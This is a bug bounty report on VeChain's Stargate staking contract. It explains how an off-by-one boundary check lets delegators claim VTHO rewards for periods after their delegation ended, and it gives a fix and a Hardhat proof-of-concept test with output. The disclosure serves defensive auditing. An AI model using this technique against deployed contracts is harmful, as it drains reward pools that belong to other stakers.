# 59665 sc high delegators can claim rewards beyond delegation end

**Submitted on Nov 14th 2025 at 16:01:20 UTC by @danvinci\_20 for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59665
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:** Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Summary

The system incorrectly determines the claimable reward periods for a delegated NFT after the delegator has requested to exit.

This occurs because the ended-delegation branch uses a strict comparison:

```solidity
endPeriod > nextClaimablePeriod
```

instead of the correct:

```solidity
endPeriod >= nextClaimablePeriod
```

When `endPeriod == nextClaimablePeriod`, the code fails to recognize that the delegation has already ended and instead treats it as still active. As a result, once new validator periods are completed, the delegator can call `claimRewards()` to claim rewards for periods after their delegation has already ended, even though their stake is no longer contributing and the validator is no longer using their VET.

This allows delegators to drain rewards for periods they did not stake for, extracting unearned VTHO and destabilizing the reward pool.

### Vulnerability Details

Relevant code paths:

Core logic is inside `_claimableDelegationPeriods`:

```solidity
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod
) {
    return (nextClaimablePeriod, endPeriod);
}
```

Because the condition uses a strict `endPeriod > nextClaimablePeriod`, the ended-delegation branch does not trigger when the `staker` has claimed up to exactly `endPeriod - 1`.

The system incorrectly assumes the delegation is still active and falls through to this logic:

```solidity
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

This returns:

```
(firstClaimable = nextClaimablePeriod,
 lastClaimable = completedPeriods)
```

Meaning the delegator can now claim rewards for all periods between `endPeriod` and the current completed period, even though the validator is no longer using their stake.

### Impact

Delegators can claim VTHO rewards for validator periods after their delegation has ended, receiving rewards they did not earn.

### Recommendation

{% hint style="warning" %}
Fix the boundary condition in the ended-delegation branch to be inclusive:

```solidity
endPeriod >= nextClaimablePeriod
```

This ensures when the delegator has claimed up to `endPeriod - 1` (so `nextClaimablePeriod == endPeriod`), the ended-delegation branch will correctly cap claimable periods to the delegation end.
{% endhint %}

## Proof of Concept

<details>

<summary>PoC: additional helper function and integration test demonstrating the issue</summary>

Add this function to `Stargate.sol`:

```solidity
function getLastClamiedPeriod(uint256 tokenId) public view returns(uint256) {
    return _getStargateStorage().lastClaimedPeriod[tokenId];
}
```

Add the following test to `test/integration/Delegation.test.ts` and run:

```
yarn hardhat test --network vechain_solo test/integration/Delegation.test.ts
```

Test (excerpt):

```ts
it.only("any user can drain the rewards for periods, they didn't stake for", async () => {
    const paramsKey = "0x00000000000064656c656c656761746f722d636f6e74726163742d61646472657373";
    const stargateAddress = await protocolParamsContract.get(paramsKey);
    const expectedParamsVal = BigInt(await stargateContract.getAddress());
    expect(stargateAddress).to.equal(expectedParamsVal);

    const validatorAddress = await protocolStakerContract.firstActive();
    expect(compareAddresses(validatorAddress, deployer.address)).to.be.true;

    const [leaderGroupSize, queuedValidators] =
        await protocolStakerContract.getValidationsNum();
    expect(leaderGroupSize).to.equal(1);
    expect(queuedValidators).to.equal(0);

    // staking the token here 
    const levelId = 1;
    const levelSpec = await stargateNFTContract.getLevel(levelId);
    const levelVetAmountRequired = levelSpec.vetAmountRequiredToStake;

    // Stake an NFT of level 1
    const stakeTx = await stargateContract
        .connect(user)
        .stake(levelId, { value: levelVetAmountRequired });
    await stakeTx.wait();

    // Assert owner and maturity
    const tokenId = await stargateNFTContract.getCurrentTokenId();
    expect(await stargateNFTContract.ownerOf(tokenId)).to.equal(user.address);
    expect(await stargateNFTContract.isUnderMaturityPeriod(tokenId)).to.be.true;

    // Fast-forward until the NFT is mature
    await mineBlocks(Number(levelSpec.maturityBlocks));

    expect(await stargateNFTContract.isUnderMaturityPeriod(tokenId)).to.be.false;

    // Delegate the NFT
    const delegateTx = await stargateContract.connect(user).delegate(tokenId, deployer.address);
    await delegateTx.wait();

    const delegation = await stargateContract.getDelegationDetails(tokenId);
    let [start,] = await protocolStakerContract.getDelegationPeriodDetails(delegation.delegationId);

    let [period,startBlock,,completedPeriods] = await protocolStakerContract.getValidationPeriodDetails(deployer.address);

    await fastForwardValidatorPeriods(Number(period), Number(startBlock), 5);

    [,,,completedPeriods] = await protocolStakerContract.getValidationPeriodDetails(deployer.address);

    let delegatorRewards = await protocolStakerContract.getDelegatorsRewards(deployer.address, 2);

    // claim accumulated rewards
    const claimTx = await stargateContract.connect(user).claimRewards(tokenId);
    await claimTx.wait();

    let lastClaimedperiod = await stargateContract.getLastClamiedPeriod(tokenId);

    const exitTx = await stargateContract.connect(user).requestDelegationExit(tokenId);
    await exitTx.wait();

    let [,endPeriod] = await protocolStakerContract.getDelegationPeriodDetails(delegation.delegationId);

    await fastForwardValidatorPeriods(Number(period), Number(startBlock), 10);

    [,,,completedPeriods] = await protocolStakerContract.getValidationPeriodDetails(deployer.address);

    let [firstclaimableNow, lastClaimableNow] = await stargateContract.claimableDelegationPeriods(tokenId);
});
```

Observed output (relevant lines):

```
start period of delegation:  2n
completedPeriods After:  6n
lastClaimedperiod:  6n
endPeriod:  7n
completedPeriods After:  17n
claimable periods:  7n 17n
✔ any user can drain the rewards for periods, they didn't stake for (48618ms)
```

This demonstrates that after requesting exit (endPeriod == 7) and having last claimed period == 6, the contract reports claimable periods starting at 7 and extending to 17, allowing claims for periods after delegation end.

</details>
